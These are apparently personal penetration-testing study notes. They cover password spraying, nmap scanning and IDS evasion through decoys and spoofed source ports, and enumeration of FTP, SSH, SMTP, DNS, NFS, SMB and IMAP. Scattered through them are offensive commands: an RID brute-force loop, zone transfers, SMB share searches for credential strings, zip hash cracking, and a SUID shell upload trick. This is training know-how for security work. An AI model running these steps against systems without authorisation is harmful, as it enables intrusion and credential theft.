# Authentication

## General process

1. **Password Spraying**: 
   - Empty authentication (Anonymous login)
   - Default authentication: 
     - Google: *service + default credentials*
     - Web:
       - admin
       - user
     - Linux:
       - root (linux), 
     - Windows:
       - Guest
       - Administrator
   - Password: (*password*, same as username)
   - Password reuse on other services
   - Generate passwords with `pswgen`
3. **Brute Forcing**

   - zip files: johnthe ripper, use zip2john to convert it
     - `zip2john backup.zip > backup.hash`
     - `john backup.hash`

**Cracking:** `hashid` ->  [crackstation](https://crackstation.net/)

# Network

## Enumeration

### Host Discovery

Given one or more IP addresses, we want to see which ones are alive. To do this, we can use ICMP echo requests, and see which ones provide an ICMP reply to this. 

**nmap options:**

```bash
$ sudo nmap [IP] -sn | grep for | cut -d" " -f5
```

This scanning method works only if the firewalls of the hosts allow it.

- IP format:

  - range  `nmap [IP_start/IP_end]`

  - host list: `nmap -iL FILE`
  - multiple ips [IP1] [IP2] ...

- **`-sn`**: perform a "ping scan"  without performing a full port scan. 

- **`-d" "`**: Specifies a space as the delimiter.

- **`-f5`**: Tells `cut` to output the fifth field (word) from each line.

- `-PE`:  Perform only *ICMP* ping scan. 

- `--reason` Displays why an host is alive

- `--packet-trace` Shows all packages sent and received

### Service scanning

The **TCP-SYN scan** (`-sS`) is one of the default settings  unless we have defined otherwise and is also one of the most popular  scan methods. This scan method makes it possible to scan several  thousand ports per second. The TCP-SYN scan sends one packet with the  SYN flag and, therefore, never completes the three-way handshake, which  results in not establishing a full TCP connection to the scanned port.

- If our target sends a `SYN-ACK` flagged packet back to us, Nmap detects that the port is `open`.
- If the target responds with an `RST` flagged packet, it is an indicator that the port is `closed`.
- If Nmap does not receive a packet back, it will display it as `filtered`. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.

#### **nmap options:**

- `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. Also runs some default scripts

- `-sV` show the versions (banner grabbing)

- `-p-` all ports

- `--disable-arp-ping`: Disables ARP requests, so the scan doesn't switch to ARP requests when scanning local networks.

- `-Pn` disable the ICMP echo requests 

- `-n` disable DNS resolution

- `-A` aggressive scan

- `--packet-trace` Shows all packages sent and received

- `--version-trace` Show all version packages

- `--version-all` (Try every single probe to determine the version)          

- **protocols:**

  - `-sU` performs UDP scan
  - `-sS` SYN Scan: default
  - `-sT` Connect scan: sends a  `SYN` packet -> the port is open if it answers with  `SYN-ACK` packet and closed with an `RST` packet. 
    - Less stealthy and slow than `-sS`, but highly accurate.
    - Useful when the target has a firewall that drops incoming packets but allows outgoing packets. 

  - `-sA` ACK scan: much harder to filter for firewalls and IDS/IPS systems because they only send a TCP packet with only the ACK flag. 

  - `-O`: Performs operation system detection scan.

- **Firewall / IDS usuful flags:**

  - change protocol
  - `-D RND:5` Generates five random IP addresses that indicates the source IP the connection comes from.
  - `-S` Scans the target by using different source IP address.
  - `-e [INTERFACE]` Sends all requests through the specified interface.
  - `--dns-server <ns>,<ns>`) to specify DNS servers. 
  - `--source-port 53` specify a source port  for our scans. 
  - `-T` specifies the timeing (`0` paranoid - `5` insane)

- `nmap --script <script name> -p <port> <host>` to run other scripts.

  `--script "dns-* and discovery and not intrusive"`: this uses all the dns related scripts in the category discovery and not in the category intrusive. Here all the categories:

  - `auth` Determination of authentication credentials.
  - `broadcast` Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
  - `brute` Executes scripts that try to log in to the respective service by brute-forcing with credentials.
  - `default` Default scripts executed by using the -sC option.
  - `discovery` Evaluation of accessible services.
  - `dos` These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.
  - `exploit` This category of scripts tries to exploit known vulnerabilities for the scanned port.
  - `external` Scripts that use external services for further processing.
  - `fuzzer` This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.
  - `intrusive` Intrusive scripts that could negatively affect the target system.
  - `malware` Checks if some malware infects the target system.
  - `safe` Defensive scripts that do not perform intrusive and destructive access.
  - `version` Extension for service detection.
  - `vuln` Identification of specific vulnerabilities.



#### **nmap output**

- **`open`:** Connection to the scanned port has been established. These connections can be **TCP connections**, **UDP datagrams** as well as **SCTP associations**.

  - If the UDP port is `open`, we only get a response if the application is configured to do so.

- **`closed`:** 

  - The TCP protocol indicates that the packet we received back contains an `RST` flag. 
  - In the UDP scan, if we get an ICMP response with `error code 3` (port unreachable), we know that the port is indeed closed.

- **`filtered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because:

  - the package was *dropped*: Nmap receives no response, and by default will resend the request, by setting the retry rate (`--max-retries`) to 10. 
  - A *firewall* reject the package: As a response, we could get one of the following error messages:
    - Net Unreachable
    - Net Prohibited
    - Host Unreachable
    - Host Prohibited
    - Port Unreachable
    - Proto Unreachable

- **`unfiltered`:** Nmap cannot correctly identify whether the scanned port is open or  closed because either *no response is returned* from the target for the  port or we get *an error code* from the target.

- **`open|filtered`:** If we do not get a response for a specific port, `Nmap` will set it to that state. This indicates that a firewall or packet filter may protect the port.

  - In UDP scan if the ICMP response was neither open nor closed, it will be marked as `open|filtered.

- **`closed|filtered`:** This state only occurs in the **IP ID idle** scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.

- **`tcpwrapped`** it means that the behavior of the port is consistent with one that is  protected by tcpwrapper. Specifically, it means that a full TCP  handshake was completed, but the remote host closed the connection  without receiving any data. 

  tcpwrapper protects *programs*, not ports. This means that a valid (not false-positive) `tcpwrapped` response indicates a real network service is available, but you are not on the list of hosts allowed to talk with it. When such a large number  of ports are shown as `tcpwrapped`, it is unlikely that they represent real services, so the behavior probably means something else.

**Firewalls and IDS/IPS**

Like the firewall, the intrusion detection system (`IDS`) and intrusion prevention system (`IPS`) are also software-based components. `IDS` scans the network for potential attacks, analyzes them, and reports any detected attacks. `IPS` complements `IDS` by taking specific defensive measures if a potential attack should have been detected, such as blocking the attacker's IP. Thus, from an attacker perspective, firewalls and IDS can be treated in the same way.

Here some way to deal with them:

- Change scanning protocol

- Change rate limit and intensity. If this isn't improving the results, then it means that it is a firewall and not a IPS, with `-T` and `--version-all`.

- Decoys:
  With the option `-D`,  Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent, e.g. `-D RND:5` it sends 5 random ones.

- IP ID manipulation: 

  There could be situations where only certain **subnets** are restricted from accessing specific services on a server. 

  In these cases, you might want to **manually specify a different source IP address** (using the `-S` and  `-e [interface (e.g. tun0)]` options ) from the ones in `ifconfig` to see if a different IP address (perhaps from a different subnet) gets better results.

- DNS Proxying

  - `--dns-server <ns>` to specify DNS servers, e.g. `1.1.1.1`. This method could be fundamental if we are in a demilitarized zone (`DMZ`). The company's DNS servers are usually more trusted than those from the  Internet. 

  - `--source-port 53` specifies the source port. If the administrator uses the firewall to control this  port and does not filter IDS/IPS properly, our TCP packets will be  trusted and passed through.

- If the firewall accepts `TCP port 53`, it is very likely that IDS/IPS filters might also be configured much  weaker than others. We can test this by trying to connect to this port  by using `Netcat`.

### Version Fingerprinting

Get as much information about server and network

- **Banner grabbing** is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner  once a connection is initiated.

  - `-sV` and `--version-all` it is usually enough

  - `nmap -sV --script=banner <target>` 

  - manually: connect to the SMTP server using `nc`, grab the banner, and intercept the network traffic using `tcpdump`

    ```bash
    sudo tcpdump -i [eth0/tun0] host [YOUR_IP] and [IP_TO_LISTEN]
    ```

    ```bash
    sudo ncat -v [IP] [PORT] {--source-port }
    ```

    add `--udp` if the port you want to connect to with netcat is upd.
    Note that if netcat times out, then you should just try more times.

- **SNMP (Simple Network Management Protocol) :** string that provide information and statistics about a router or device

  - v1, v2:  everything is send in the clear
  - v3: security measure, encryption and authentication
  - [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

## Service Hacking

### Service Types

**Services:**

- Authentication protocols (ssh, telnet, rdp, smb, vnc) → Find the credentials
- Read/Write (redis, ftp, tftp, smb, nfs, rsync, snmp, rpc, netbios, ldap)
- Database (redis, mysql, mssql, psql, mongodb, oracle-tns, whois)
- Network Access (squid, isakmp, irc, dns)
- E-mail (smtp, pop3, imap)

**Stacks (common ports)**

- 135, 139, 445 -> SMB
- 80, 8080, 8000, 8443, 3000 -> HTTP
- 88, 389, 5985 -> Active Directory
- 21, 2121 -> FTP
- 22, 2222 -> SSH
- 1433, 3306, 5432, 27017 -> DB: MsSQLS, MySQL, PSQL, Mongo

### 21 - FTP

#### Generalities:

**Type:** 

Authentication, Read/Write

- Protocol:

  In an FTP connection, two channels are opened. First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status  codes. Then both communication participants can establish the data  channel via `TCP port 20`. This channel is used exclusively  for data transmission, and the protocol watches for errors during this  process. If a connection is broken off during transmission, the  transport can be resumed after re-established contact.

- Active vs Passive mode:

  A distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as  described via TCP port 21 and thus informs the server via which  client-side port the server can transmit its responses. However, if a  firewall protects the client, the server cannot reply because all  external connections are blocked. For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the  connection in this method, the firewall does not block the transfer.

- [List of FTP return codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)

#### Interaction:

- `ftp`

  - `cd`, `ls`, to navigate
  - `get` `put` to download/upload
  - `status` to check the settings
  - `LIST -R`, if the setting ls_recurse_enable=YES, this show all the content at once.
  - `debug`
  - `trace`

- Download all available files:

  ```bash
  wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
  ```

- If TLS/SSl encryption is present, to get the certificate:

  ```bash
  openssl s_client -connect [IP] -starttls ftp
  ```

  This will also show the SSL certificate

- netcat/telnet

#### Exploit:

- Anonymous login: anonymous:anonymous

- File upload
  - LFI
  - with web servers, it is common that files are synchronized

- sniffing with tcpdump could be possible
- If the user are shown (i.e. the setting `hide_ids`, which makes all user and group information in directory listings will be displayed as "ftp", is set on NO)

**vsFTPd Configuration**

- The default configuration of vsFTPd can be found in `/etc/vsftpd.conf`
- Possible settings: [man page](http://vsftpd.beasts.org/vsftpd_conf.html).
- `/etc/ftpusers` is used to deny certain users access to the FTP service.

### 22 - SSH

#### Generalities

- **Type:** authentication

- Authentication protocol:

  1. Server Authentication:

     The server sends an encrypted certificate to the client 

  2. Client authentication:

     The client enters a password, which was saved as an encrypted hash by the server

- Authentication methods:

  - Password authentication

  - Public-key authentication

    The private key is stored on the user's own computer and secured with a passphrase. Public keys are also stored on the server., and can be decrypted with the private key.

  - Host-based authentication

  - Keyboard authentication

  - Challenge-response authentication

  - GSSAPI authentication

#### Configuration

The [sshd_config](https://www.ssh.com/academy/ssh/sshd_config) file is in `/etc/ssh/sshd_config`

**Dangerous settings**

| **Setting**                  | **Description**                                              |
| ---------------------------- | ------------------------------------------------------------ |
| `PasswordAuthentication yes` | Allows password-based authentication. Allows to brute-force a known username for possible passwords. |
| `PermitEmptyPasswords yes`   | Allows the use of empty passwords.                           |
| `PermitRootLogin yes`        | Allows to log in as the root user.                           |
| `Protocol 1`                 | Uses an outdated version of encryption.                      |
| `X11Forwarding yes`          | Allows X11 forwarding for GUI applications.                  |
| `AllowTcpForwarding yes`     | Allows forwarding of TCP ports.                              |
| `PermitTunnel`               | Allows tunneling.                                            |
| `DebianBanner yes`           | Displays a specific banner when logging in.                  |

#### Exploit

-  `SSH-1` is vulnerable to `MITM` attacks

#### Interaction

````bash
./ssh-audit.py [IP]
````

For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.

```bash
ssh -v [USER]@[IP] -o PreferredAuthentications=[PASSWD]
```

- version

  By default, the banners start with the version of the protocol that can  be applied and then the version of the server itself. For example, with `SSH-1.99-OpenSSH_3.9p1`, we know that we can use both protocol versions SSH-1 and SSH-2, and we  are dealing with OpenSSH server version 3.9p1. On the other hand, for a  banner with `SSH-2.0-OpenSSH_8.2p1`, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version.

### 25, 465, 587 - SMTP

#### Generalities:

**Type: ** Email

- Purpose:

  - Sends emails in an IP network, often combined with the IMAP or POP3 protocols, which can fetch emails and send emails.
  - Prevents spam using authentication mechanisms that allow only authorized users to send e-mails.

- Used with SSL/TLS encryption.

- Protocol:

  ![image-20241104144603042](/home/damuna/.config/Typora/typora-user-images/image-20241104144603042.png)

  1.  Authentication
  2.  After sending his e-mail, the SMTP client, disassembles it into a header and a body and uploads both to the SMTP server.
  3.  Sometimes there is a *Mail Submission Agent* (`MSA`), or *Relay Server*, which checks the validity, i.e., the origin of the e-mail. 
  4.  The *Mail Transfer Agent* (`MTA`), the software basis for sending and receiving e-mails, checks the e-mail for size and spam and then stores it. 
  5.  Email is reassembled.
  6.  The *Mail Delivery Agent* (`MDA`) transfers it to the recipient's mailbox.

- Downsides:

  - No usable delivery confirmation: only an English-language error message, including the header of the undelivered message, is returned.

  - Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. 

    As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). 

  - For this purpose, an extension for SMTP has been developed called `Extended SMTP` (`ESMTP`). When people talk about SMTP in general, they usually mean ESMTP.

#### Configuration

- `/etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"`

- Dangereous settings:

  - Open Relay Configuration

    `mynetworks = 0.0.0.0/0`

    With this setting, this SMTP server can send fake emails and thus  initialize communication between multiple parties. Another attack  possibility would be to spoof the email and read it.

#### Interaction

- `telnet` list of response code [here](https://serversmtp.com/smtp-error/)

  - `AUTH PLAIN`  authenticate the client.
  - `HELO`  logs in with its computer name and thus starts the session.
  - `MAIL FROM`  names the email sender.
  - `RCPT TO`  names the email recipient.
  - `DATA`  initiates the transmission of the email.
  - `RSET`  aborts the initiated transmission but keeps the connection between client and server.
  - `VRFY`  checks if a mailbox is available for message transfer, can enumerate existing users on the system
  - `EXPN`  checks if a mailbox is available for messaging with this command.
  - `NOOP`  equests a response from the server to prevent disconnection due to time-out.
  - `QUIT`  terminates the session.

- ```bash
  telnet <ip> <port>
  # Basic interactions
  HELO <domain>
  EHLO <domain>
  VRFY root
  VRFY testuser
  # Sometimes we may have to work through a web proxy. 
  CONNECT <ip>:<port> HTTP/1.0
  # Send an email
  MAIL FROM: <[USER]@[DOMAIN]>
  RCPT TO: <[USER]@[DOMAIN]> NOTIFY=success,failure
  DATA
  ```

#### Footprinting

```bash
smtp-user-enum -M <method VRFY, EXPN, RCPT > -u <WORDLISRT> -t <ip> -D dom
```

To try with domain usually only for RCPT.

### 53 - DNS

#### Generalities:

- Purpose:

  - DNS servers translate domain names into IP addresses and thus control which server a user can reach via a  particular domain. 
  - It stores and outputs additional information about the services associated with a domain.

- Encryption:

  DNS is mainly unencrypted. Devices on the local WLAN and Internet  providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By  default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.

- Types of DNS Servers:

  - *DNS root server*

    responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. 

  - *Authoritative name server*

    hold authority for a particular zone. They only answer queries from their area of responsibility,

  - *Non-authoritative name server*

    they collect information on specific DNS zones

  - *Caching server*

    cache information from other name servers for a specified period. The  authoritative name server determines the duration of this storage.

  - *Forwarding server*

    forward DNS queries to another DNS server.

  - *Resolver*

    perform name resolution locally

- DNS records:

  - `A`  Returns an IPv4 address of the requested domain 
  - `AAAA`  Returns an IPv6 address of the requested domain.
  - `MX`  Returns the responsible mail servers 
  - `NS`  Returns the DNS servers (nameservers) of the domain.
  - `TXT`  Contains various information
  - `CNAME`  Serves as an alias for another domain name.
  - `PTR`  Converts IP addresses into valid domain names.
  - `SOA`  Provides information about the corresponding DNS zone and email address of the administrative contact.


**Configuration**

- *Local DNS configurations files*

  - [Bind9](https://www.isc.org/bind/) is often used on Linux
  - Different zones are defined here
  - The local conf files are usually:
    - `named.conf.local`
    - `named.conf.options`
    - `named.conf.log`
  - Dangerous settings:
    - `allow-query`  Defines which hosts are allowed to send requests to the DNS server.
    - `allow-recursion`  Defines which hosts are allowed to send recursive requests to the DNS server.
    - `allow-trnasfer`  Defines which hosts are allowed to receive zone transfers from the DNS server.
    - `zone-statistics`  Collects statistical data of zones.

- *zone files* `/etc/bind/db.domain.com`

  Text file that describes a DNS zone with the BIND file format. 

   There must be precisely one `SOA` record (usually at the beginning) and at least one `NS` record. 

- *reverse name resolution files* `/etc/bind/db.10.129.14`

  The computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a `PTR` record., which are responsible for the reverse translation of IP addresses into names.

#### Footprinting

- Name Servers:

  ```bash
  dig ns [NAME_SERVER] @[DNS SERVER] {+short}
  ```

- Version:

  ```bash
  dig CH TXT version.bind [DNS SERVER]
  ```

- View all available records

  ```bash
  dig ANY [NAME_SERVER] @[DNS SERVER]
  ```

- Zone Transfer

  Transfer of zones to another server in DNS, This procedure is abbreviated `Asynchronous Full Transfer Zone` (`AXFR`)

   DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master  is called a slave. The slave fetches the `SOA` record of the relevant zone from  the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA  record of the master is greater than that of the slave, the data sets no longer match.

  ```
  dig axfr [NAME_SERVER] @[DNS SERVER]
  ```

  If the administrator used a subnet for the `allow-transfer` option or set it to `any`, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames.

  ```
  dig axfr [ZONE].[NAME_SERVER] @[DNS SERVER]
  ```

  The individual `A` records with the hostnames can also be found out with the help of a brute-force attack:

  - If the Zone transfer fails, it means that you don't have access to those subdomain, thus you can do *SubDomain Brute Forcing* [DNSenum](https://github.com/fwaeytens/dnsenum)


  ```bash
dnsenum --dnsserver [DNS_SERVER] --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt [DOMAIN]
  ```



### 69u - TFTP

**Type: ** Read/write

Like FTP, but without needing authentication.

```
tftp
>
```

| **Commands** | **Description**                                              |
| ------------ | ------------------------------------------------------------ |
| `connect`    | Sets the remote host, and optionally the port, for file transfers. |
| `get`        | Transfers a file or set of files from the remote host to the local host. |
| `put`        | Transfers a file or set of files from the local host onto the remote host. |
| `quit`       | Exits tftp.                                                  |
| `status`     | Shows the current status of tftp, including the current transfer  mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off. |



### 110, 995 - POP3

#### Generalities:

**Type:** mail

- Purpose:
  - Access emails from a mail server
  - Allows online listing retrieving and deleting emails
  - Authentication to the desire mailbox
  - SSL/TLS to require an encrypted session (on the higher port if present)

#### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

#### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'pop3s://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl:

  ```bash
  openssl s_client -connect [IP]:pop3s
  ```

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

​                          

### 111tu, 2049tu - NFS

#### Generalities:

**Type:** Reade/Write, Authentication only for v4

- Purpose:

  Access file systems over a network as if they were local and is used between Linux and Unix systems.

- Version 4 vs the previous:

  In version 3 of NFS, only the client computer (i.e., the machine trying to connect to the NFS server) needs to be authenticated. Once the client is authenticated, any user on that client machine has access based on the client’s access permissions, without further authentication. In version 4, NFS, individual users are authenticated rather than just the client machine. Also, only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol across firewalls.

- Protocol:

  NFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The most common authentication is via UNIX `UID`/`GID` and `group memberships`.

#### Configuration

- `/etc/exports`
  - The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows the possible options of the file
  - First, the folder is specified and made available to others, and then  the rights they will have on this NFS share are connected to a host or a subnet.
  - Possible options:
    - `rw`  Read and write permissions. 
      - Dangerous
    - `ro`  Read only permissions.
    - `sync`  Synchronous data transfer. (A bit slower)
    - `async`  Asynchronous data transfer. (A bit faster)
    - `secure`  Ports above 1024 will not be used.
    - `insecure`  Ports above 1024 will be used. 
      - Dangerous: users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
    - `no_subtree_check`  This option disables the checking of subdirectory trees.
    - `root_squash`  Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. 
      - Dangerous: if set, we cannot edit the `backup.sh` file even as root.
    - `nohide`  If another file system was mounted below an exported directory, this directory is exported by its own exports entry. 
      - Dangerous

#### Navigation

- Show available Shares that can be mouted

  ```bash
  showmount -e [IP]
  ```

- Mount a Share

  ```bash
  $ mkdir target-NFS
  $ sudo mount -t nfs [IP]:/ ./target-NFS/ -o nolock
  $ cd target-NFS
  $ tree .
  ```

- List Content with UIDs & GUIDs

  ```bash
  ls -n mnt/nfs/
  ```

- Unmount

  ```bash
  $ cd ..
  $ sudo umount ./target-NFS
  ```


#### Exploit:

- If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUID` of that user and then run the shell via the SSH user.



### 135 - WMI

#### Generalities:

- **Type:** Authentication (remote)
- Purpose:
  - Windows Management Instrumentation (`WMI`) allows read and write access to almost all settings on Windows systems. 

#### Interaction

- to log in use  [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)

  ```
  /usr/share/doc/python3-impacket/examples/wmiexec.py [USER]:"[PASSWD]"@[IP] "hostname"
  ```

### 135, 137-9, 445 - SMB

#### Generalities:

**Type:** Read/Write, Authentication

- Purpose:

  - regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. 
- Information exchange between different system processes 


  - The client can communicate with other  participants in the same network to access files or services shared with it on the network

  - provide arbitrary parts of its local file system as shares.


- Workgroups:

  In a network, each host participates in the same `workgroup`. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network.

#### Footprinting

- nmap

- rpccclient

  ```bash
  rcpclient -U "user" [IP]
  ```

  - `srvinfo`  Server information.
  - `enumdomains`  Enumerate all domains that are deployed in the network.
  - `querydominfo`  Provides domain, server, and user information of deployed domains.
  - `netshareenumall`  Enumerates all available shares.
  - `netsharegetinfo <share>`  Provides information about a specific share.
  - `enumdomusers`  Enumerates all domain users.
  - `queryuser <RID>`  Provides information about a specific user.
  - `querydispinfo` Dispays descriptions of users (could be some ppassword in it)
  - `enumprinters`

  

  The query `queryuser <RID>` is mostly allowed based on the RID. So we can use the rpcclient to brute force the RIDs to get information. Because we may not know who has been assigned which RID, we know that  we will get information about it as soon as we query an assigned RID:

  ```bash
  for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
  ```

  - `seq 500 1100` generates a sequence of numbers from 500 to 1100
  - `-c "queryuser 0x$(printf '%x\n' $i)"`: Executes the `queryuser` command to query information about a user by their RID (Relative Identifier)

- `mount

  - ```bash
    sudo mkdir /tmp/share
    sudo mount -t cifs -o username=[],password=[],domain=. //192.168.220.129/share /tmp/share
    ```

- [SMBMap](https://github.com/ShawnDEvans/smbmap)

- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

-  Windows `CMD`

  - ```cmd-session
    # Display Share and connect
    net use n: \\192.168.220.129\Share /user:user pass
    
    # Search for file name
    dir n:\*[STRING]* /s /b	
    
    # Search for string in file
    findstr /s /i cred n:\*.*
    ```

    Some string to search for:

    - cred, password, users, secrets, key
    - Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.

- `Powershell`

  - ```powershell-session
    # Display share
    Get-ChildItem \\192.168.220.129\share\
    
    # Connect with Anonymous
    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem"
    
    # Connect with credentials
    $username = 'plaintext'
    $password = 'Password123'
    $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
    New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem" -Credential $cred
    
    # Serch file name
    Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
    
    # Search string in file
    Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
    ```

- Navigation:

- `smbclient -N //[IP ADDRESS]{/FOLDER}`
  
  - `-N` anonymous access
  - `-L` display the list of shares (only to display without access!!)
  
    The ones accessible without authentication don't have the dollar sign `$`
- `cd`, `ls`, and to download a file `get`.
- `!<cmd>` to execute local system commands without interrupting the connection
- `smbstatus` shows the version and who, from which host, and which share the client is connected
- `psexec` to open a shell

**Exploit**

- Anonymous Login
- EternalBlue: anything that uses SMBv1 is at risk

**Configuration**

- `/etc/samba/smb.conf` to change settings
- Dangerous settings:
  - `browseable - yes`: Allow listing available shares in the current share

### 143, 993 IMAP

#### Generalities:

**Type:** mail

- Purpose:
  - Access emails from a mail server
  - Allows online management on the server (supports folders)
  - Authentication to the desire mailbox
  - No-encryption: transmits commands, emails, or usernames and passwords in plain text.
  - SSL/TLS to require an encrypted session (on the higher port if present)

#### Configuration

In the documentation of Dovecot, we can find the individual [core settings](https://doc.dovecot.org/settings/core/) and [service configuration](https://doc.dovecot.org/configuration_manual/service_configuration/) options.

**Dangerous Settings:**

| **Setting**               | **Description**                                              |
| ------------------------- | ------------------------------------------------------------ |
| `auth_debug`              | Enables all authentication debug logging.                    |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons. |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated. |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

#### Interaction

- nmap will return the available commands that can be executed

- If we discover the credentials:

  ```bash
  curl -k 'imaps://[IP]' --user user:password -v
  ```

  -  `verbose` (`-v`) we can see the version of TLS used for  encryption, further details of the SSL certificate, and even the banner, which could contain the version of the mail server.

- To connect via openssl (also `netcat` is possible):

  ```bash
  openssl s_client -connect [IP]:imaps
  ```

```bash
# Login
    A1 LOGIN username password
Values can be quoted to enclose spaces and special characters. A " must then be escape with a \
    A1 LOGIN "username" "password"

# List Folders/Mailboxes
    A1 LIST "" *
    A1 LIST INBOX *
    A1 LIST "Archive" *

# Create new Folder/Mailbox
    A1 CREATE INBOX.Archive.2012
    A1 CREATE "To Read"

# Delete Folder/Mailbox
    A1 DELETE INBOX.Archive.2012
    A1 DELETE "To Read"

# Rename Folder/Mailbox
    A1 RENAME "INBOX.One" "INBOX.Two"

# List Subscribed Mailboxes
    A1 LSUB "" *

#Status of Mailbox (There are more flags than the ones listed)
    A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

# Select a mailbox
    A1 SELECT INBOX

# List messages
    A1 FETCH 1:* (FLAGS)
    A1 UID FETCH 1:* (FLAGS)

# Retrieve Message Content
    A1 FETCH 2 body[text]
    A1 FETCH 2 all
    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

# Close Mailbox
    A1 CLOSE

# Logout
    A1 LOGOUT
```

### 161u - SNMP

#### Generalities

**Type:** Database

- Purpose:
  - monitor network devices
  - handle configuration tasks and change settings remotely
  - SNMP-enabled hardware includes routers, switches, servers, IoT devices...
  - Sends traps over UDP port 161: data packets sent from the SNMP server to the client without  being explicitly requested. If a device is configured accordingly, an  SNMP trap is sent to the client once a specific event occurs on the  server-side. For the SNMP client and server to exchange the respective values, the  available SNMP objects must have unique addresses known on both sides. 
- MIB
  - Text file in which all queryable SNMP objects of a device are listed as a tree
  - It contains at least one `Object Identifier` (`OID`) (a node in the tree, uniquely identified by a sequence of numbers), which, in addition to the necessary unique address and a name, also  provides information about the type, access rights, and a description of the respective object.
- Authentication and Encryption
  - Only in version 3 we have encryption and authentication via user:pass
